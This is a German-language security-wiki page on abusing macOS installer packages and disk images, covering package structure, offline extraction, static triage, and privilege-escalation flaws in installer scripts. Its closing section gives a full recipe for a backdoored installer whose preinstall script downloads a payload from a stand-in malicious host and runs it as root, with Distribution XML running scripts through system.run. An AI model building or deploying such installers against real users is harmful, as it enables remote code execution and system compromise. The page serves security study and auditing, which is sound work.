# Missbrauch von macOS-Installationsprogrammen

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen zu Pkg

Ein macOS-**installer package** (auch als `.pkg`-Datei bezeichnet) ist ein Dateiformat, das von macOS zur **Verteilung von Software** verwendet wird. Diese Dateien sind wie eine **Box, die alles enthält, was eine Software benötigt**, um korrekt installiert und ausgeführt zu werden.

Die Paketdatei selbst ist ein Archiv, das eine **Hierarchie von Dateien und Verzeichnissen enthält, die auf dem Zielcomputer installiert werden**. Sie kann auch **Skripte** enthalten, die Aufgaben vor und nach der Installation ausführen, beispielsweise das Einrichten von Konfigurationsdateien oder das Entfernen alter Softwareversionen.

### Hierarchie

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Anpassungen (Titel, Begrüßungstext …) sowie Skript- und Installationsprüfungen
- **PackageInfo (xml)**: Informationen, Installationsanforderungen, Installationsort und Pfade zu auszuführenden Skripten
- **Bill of materials (bom)**: Liste der zu installierenden, aktualisierenden oder entfernenden Dateien mit Dateiberechtigungen
- **Payload (CPIO archive gzip compressed)**: Zu installierende Dateien im `install-location` aus PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Vor- und Nachinstallationsskripte sowie weitere Ressourcen, die zur Ausführung in ein temporäres Verzeichnis extrahiert werden.

### Dekomprimieren
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Um den Inhalt des Installers zu visualisieren, ohne ihn manuell zu dekomprimieren, kannst du auch das kostenlose Tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) verwenden.

### Kurztipps für die statische Triage

Wenn das Ziel die Analyse ist, solltest du versuchen, das Paket **nicht zuerst mit `Installer.app` zu öffnen**. Einige Pakete können Code ausführen, sobald Installer sie öffnet, beispielsweise über `system.run()` oder Installer-Plug-ins. Daher ist die Offline-Extraktion in der Regel der sicherere Ausgangspunkt.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Grundlegende Informationen zu DMG

DMG-Dateien, oder Apple Disk Images, sind ein von Apples macOS verwendetes Dateiformat für Disk Images. Eine DMG-Datei ist im Wesentlichen ein **mountbares Disk Image** (es enthält ein eigenes Dateisystem), das normalerweise komprimierte und manchmal verschlüsselte Raw-Blockdaten enthält. Wenn du eine DMG-Datei öffnest, **mountet macOS sie so, als wäre sie ein physisches Laufwerk**, sodass du auf ihren Inhalt zugreifen kannst.

> [!CAUTION]
> Beachte, dass **`.dmg`**-Installer **so viele Formate** unterstützen, dass einige davon in der Vergangenheit Schwachstellen enthielten, die ausgenutzt wurden, um **Kernel-Codeausführung** zu erlangen.

### Hierarchie

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die Hierarchie einer DMG-Datei kann je nach Inhalt unterschiedlich sein. Bei Application-DMGs folgt sie jedoch normalerweise dieser Struktur:

- Oberste Ebene: Dies ist das Root des Disk Images. Es enthält häufig die Anwendung und möglicherweise einen Link zum Applications-Ordner.
- Application (.app): Dies ist die eigentliche Anwendung. Unter macOS ist eine Anwendung typischerweise ein Paket, das viele einzelne Dateien und Ordner enthält, aus denen die Anwendung besteht.
- Applications-Link: Dies ist eine Verknüpfung zum Applications-Ordner unter macOS. Dadurch soll die Installation der Anwendung erleichtert werden. Du kannst die .app-Datei auf diese Verknüpfung ziehen, um die App zu installieren.

## Privesc via pkg abuse

### Ausführung aus öffentlichen Verzeichnissen

Wenn ein Pre- oder Post-Installation-Script beispielsweise aus **`/var/tmp/Installerutil`** ausgeführt wird und ein Angreifer dieses Script kontrollieren kann, kann er seine Privilegien erhöhen, sobald es ausgeführt wird. Ein weiteres ähnliches Beispiel:<sup>[[1]](#references)[[3]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dies ist eine [öffentliche Funktion](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), die von mehreren Installern und Updatern aufgerufen wird, um **etwas als root auszuführen**. Diese Funktion akzeptiert den **Pfad** zur **Datei**, die **ausgeführt** werden soll, als Parameter. Wenn ein Angreifer diese Datei jedoch **modifizieren** könnte, wäre er in der Lage, ihre Ausführung mit root zu **missbrauchen**, um **seine Privilegien zu erhöhen**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Für weitere Informationen siehe diesen Vortrag: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Missbrauch von Umgebungsvariablen und Shebangs

Aktuelle PackageKit-Bugs haben gezeigt, dass Installationsskripte häufig als **vertrauenswürdiger Root-Code** ausgeführt werden, während sich weiterhin vom Angreifer kontrollierter Kontext in der Nähe befindet. Bei der Prüfung von Anbieterpaketen sollte besonders auf Folgendes geachtet werden:

- Shell-Interpreter wie `#!/bin/zsh` / `#!/bin/bash`
- Aufrufe wie `sudo -u $USER`, `launchctl asuser` oder jegliche Logik, die `$USER`, `$HOME`, `PATH`, `TMPDIR` oder relative Pfade als vertrauenswürdig behandelt
- Nicht-Shell-Interpreter, die möglicherweise benutzerkontrollierte Init-Dateien oder Libraries laden
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Für den PackageKit-Bug von 2024 in der root-Umgebung (Vererbung von `~/.zshenv` / `~/.bash*` während vom Benutzer gestarteter Installationen) siehe [die generische macOS-privesc-Seite](../macos-privilege-escalation.md). Wenn das Paket **von Apple signiert** ist, kann derselbe Script-Bug **SIP/TCC-relevant** werden, da `system_installd` möglicherweise `com.apple.rootless.install.heritable` besitzt; siehe [die SIP-Seite](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)[[6]](#references)</sup>

### Ausführung durch Mounten

Wenn ein Installer nach `/tmp/fixedname/bla/bla` schreibt, ist es möglich, einen **Mount** über `/tmp/fixedname` mit noowners **zu erstellen**, sodass du **während der Installation jede Datei ändern** und den Installationsprozess missbrauchen könntest.

Ein Beispiel dafür ist **CVE-2021-26089**, bei dem ein **periodisches Script überschrieben** werden konnte, um eine Ausführung als root zu erreichen. Weitere Informationen findest du im Vortrag: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg als Malware

### Leerer Payload

Es ist möglich, einfach eine **`.pkg`**-Datei mit **Pre- und Post-Install-Scripts** zu erzeugen, ohne einen echten Payload abgesehen von der in den Scripts enthaltenen Malware.

### JS in Distribution xml

Es ist möglich, **`<script>`**-Tags in der **Distribution-xml**-Datei des Pakets hinzuzufügen. Dieser Code wird ausgeführt und kann mithilfe von **`system.run`** Befehle **ausführen**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Bei Distribution-Paketen hängt dies normalerweise davon ab, dass die übergeordnete `Distribution`-Datei externe Scripts aktiviert, beispielsweise mit `allow-external-scripts="true"`. Daher reicht es nicht aus, nur `preinstall` / `postinstall` zu überprüfen: Das **Distribution XML selbst** kann `installation-check`- / `volume-check`-Hooks sowie direkte Ausführungspfade über `system.run()` / `system.runOnce()` enthalten.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Bösartiger Installer, der ein Script und JS-Code in dist.xml verwendet
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referenzen

- [1] [DEF CON 27 - Pkgs entpacken: Ein Blick ins Innere von Macos Installer Packages und häufigen Sicherheitslücken](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: „Die wilde Welt der macOS Installer“ - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - MacOS Installer Packages entpacken](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages ausnutzen](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Privilege Escalation in macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [SIP mit Apple-signierten Packages brechen](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: „Berg der Bugs“ - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Tod durch 1.000 Installer auf macOS und alles ist kaputt!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
